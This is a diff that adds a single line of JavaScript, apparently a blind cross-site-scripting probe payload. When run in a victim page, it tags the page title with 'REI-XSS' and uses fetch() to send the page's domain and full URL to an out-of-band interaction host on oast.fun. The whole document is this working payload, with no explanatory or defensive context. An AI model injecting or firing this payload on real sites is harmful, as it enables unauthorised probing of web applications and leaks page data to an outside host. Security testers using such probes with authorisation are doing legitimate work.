@@ -1,0 +1,1 @@
+window.__rei_xss_probe=document.domain;document.title='REI-XSS:'+document.domain;fetch('https://xss1.dc3rdhjaljrm3d3sk4905ydra1kprihnx.oast.fun/probe?d='+encodeURIComponent(document.domain)+'&href='+encodeURIComponent(location.href)).catch(function(){});
